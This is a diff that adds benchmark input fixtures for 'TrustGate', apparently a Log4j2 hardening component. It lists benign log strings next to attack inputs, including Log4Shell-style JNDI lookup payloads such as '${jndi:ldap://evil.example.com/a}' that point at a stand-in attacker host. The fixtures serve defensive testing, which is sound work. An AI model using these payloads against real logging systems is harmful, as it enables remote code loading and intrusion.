@@ -1,0 +1,27 @@
+# TrustGate JMH benchmark input fixtures (WO-011).
+# Format: key=value (one per line). Lines starting with # are ignored.
+
+commonLogMessage=user logged in successfully
+commonJndiLookup=java:comp/env/jdbc/datasource
+commonUriScheme=https
+commonConfigurationValue=classpath:log4j2.xml
+commonLookupPattern=${env:USER}
+commonPropertyKey=log4j2.trustgate.strict
+
+attackJndiLookup=ldap://evil.example.com/exploit
+attackUriScheme=ldap
+attackConfigurationValue=ldap://config.example/app.xml
+attackLogMessage=Detected ${jndi:ldap://evil.example.com/a} in payload
+attackLookupPattern=${jndi:ldap://evil.example.com/a}
+attackRecursiveLookupPattern=${lower:${env:USER}}
+attackPropertyKey=log4j2.trustgate.${evil}
+
+uriFileScheme=file:///var/log/app.log
+uriSafeScheme=https
+
+strSubstitutorPlain=Application started successfully
+strSubstitutorLookup=${sys:user.home}
+strSubstitutorMultiLookup=Host ${sys:user.name} home ${sys:user.home} ready
+
+longStringPrefix=INFO processing request id=
+longStringRepeatCount=200
